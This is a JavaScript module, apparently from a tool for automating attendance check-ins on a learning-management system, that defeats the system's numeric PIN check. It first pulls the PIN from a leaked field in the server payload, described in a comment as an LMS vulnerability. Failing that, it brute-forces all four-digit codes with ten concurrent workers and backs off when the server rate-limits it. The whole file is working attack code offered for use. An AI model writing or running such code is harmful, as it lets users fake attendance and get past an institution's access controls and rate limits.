'use strict';

const { BackoffGuard } = require('../utils/backoff-guard');

/**
 * Executes a Number Code attendance check via API brute forcing or direct lookup.
 */
class PinAuthStrategy {
  constructor(agent, logger) {
    this.agent = agent;
    this.logger = logger;
  }

  async execute(taskId, payload) {
    // Attempt direct extraction first (LMS vulnerability)
    const directCode = payload.rollcall_settings?.number_code;
    if (directCode) {
      this.logger.info(`Extracted PIN directly from payload: ${directCode}. Submitting...`);
      return await this._submitCode(taskId, directCode);
    }

    // Fallback: Brute force 0000 - 9999
    this.logger.info('PIN not in payload. Starting concurrent brute force...');
    return await this._bruteForce(taskId);
  }

  async _bruteForce(taskId) {
    const maxConcurrency = 10;
    const codes = Array.from({ length: 10000 }, (_, i) => i.toString().padStart(4, '0'));
    const backoff = new BackoffGuard(20, 2000);

    let currentIndex = 0;
    let found = false;
    let successMessage = '';

    const worker = async () => {
      while (currentIndex < codes.length && !found) {
        const code = codes[currentIndex++];
        
        try {
          const res = await this._submitCode(taskId, code);
          if (res.status === 'SUCCESS') {
            found = true;
            successMessage = `Successfully bruteforced PIN: ${code}`;
            return;
          } else if (res.status === 'TRANSIENT_FAILURE') {
            currentIndex--; // Retry this code
            if (!backoff.recordFailure()) {
              throw new Error('Too many transient failures during brute force.');
            }
            await backoff.wait();
          } else {
            backoff.reset(); // Wrong code, but request was successful
          }
        } catch (err) {
          this.logger.error(`Brute force worker error: ${err.message}`);
        }
      }
    };

    const workers = Array.from({ length: maxConcurrency }, () => worker());
    await Promise.all(workers);

    return { status: found ? 'success' : 'failed', message: successMessage || 'Brute force exhausted.' };
  }

  async _submitCode(taskId, code) {
    const url = this.agent.endpoints.submitPin(taskId);
    const body = new URLSearchParams({ number_code: code });

    const res = await this.agent.request(url, {
      method: 'PUT',
      body: body.toString(),
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
    });

    const data = await res.json();
    
    // Evaluate response heuristically to determine success
    if (data.status === 1 && !data.error) {
      return { status: 'SUCCESS' };
    }
    
    if (data.error && data.error.includes('Too many requests')) {
      return { status: 'TRANSIENT_FAILURE' };
    }

    return { status: 'WRONG_CODE' };
  }
}

module.exports = {
  PinAuthStrategy
};
